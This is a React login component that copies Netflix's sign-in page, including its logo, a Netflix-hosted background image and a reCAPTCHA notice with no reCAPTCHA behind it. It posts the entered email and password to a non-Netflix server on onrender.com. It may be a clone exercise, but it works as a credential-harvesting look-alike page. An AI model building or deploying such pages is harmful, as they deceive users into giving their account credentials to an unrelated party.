import { useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';

function Login() {
  const navigate = useNavigate()
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [result, setResult] = useState("");

  function check(e) {
    e.preventDefault();
    axios.post("https://netflix-backend-z5iv.onrender.com", {
      email: user,
      password: pass
    })
      .then((res) => {
        console.log("Response from backend:", res.data);
        if (res.data.success) {
          navigate("/success");
        } else {
          navigate("/fail");
        }
      })
      .catch((err) => {
        console.error("Axios error:", err);
        navigate("/fail");
      });

  }

  return (
    <div
      className="relative w-full h-screen bg-cover bg-center"
      style={{
        backgroundImage:
          "url('https://assets.nflxext.com/ffe/siteui/vlv3/7968847f-3da9-44b3-8bbb-13a46579881f/web/IN-en-20250609-TRIFECTA-perspective_32b70b51-20d4-46db-8a1a-3d5428be5f0e_medium.jpg')",
      }}
    >

      <div className="absolute inset-0 bg-black bg-opacity-70">
        <h1 className="absolute top-10 left-10 text-4xl font-extrabold text-red-600  z-10">
          NETFLIX
        </h1>
      </div>
      <div className="absolute inset-0 flex items-center justify-center">
        <div className="bg-black bg-opacity-80 px-8 py-10 rounded-md w-[90%] max-w-md text-white">
          <h2 className="text-3xl font-bold mb-6">Sign In</h2>
          {result}

          <form className="flex flex-col space-y-3 " onSubmit={check}>
            <input
              name='email'
              type="email"
              placeholder="Email "
              required
              className="p-3 bg-neutral-800 rounded text-white  "
              onChange={(e) => setUser(e.target.value)}
            />
            <input
              name='password'
              type="password"
              placeholder="Password"
              required
              className="p-3 bg-neutral-800 rounded text-white "
              onChange={(e) => setPass(e.target.value)}
            />
            <button
              type="submit"
              className="bg-red-600 hover:bg-red-700 transition p-3 rounded font-semibold"
            >
              Sign In
            </button>

            <div className="flex items-center justify-between text-sm text-neutral-400">
              <label className="flex items-center space-x-2">
                <input type="checkbox" />
                <span>Remember me</span>
              </label>
              <a href="#" className="underline">
                Forgot password?
              </a>
            </div>
          </form>
          <div className='flex'>
            <div className="mt-6 text-sm text-neutral-400">
              New to Netflix?
              <a href="#" className="text-white hover:underline">
                Sign up now.
              </a>
            </div>
          </div>
          <div className='flex'>
            <p className="mt-4 text-xs text-neutral-500 leading-tight">
              This page is protected by Google reCAPTCHA to ensure you're not a bot.
              <a href="#" className="text-blue-500 hover:underline">
                Learn more.
              </a>
            </p>
          </div>
        </div>
      </div>
    </div>
  )
};

export default Login;
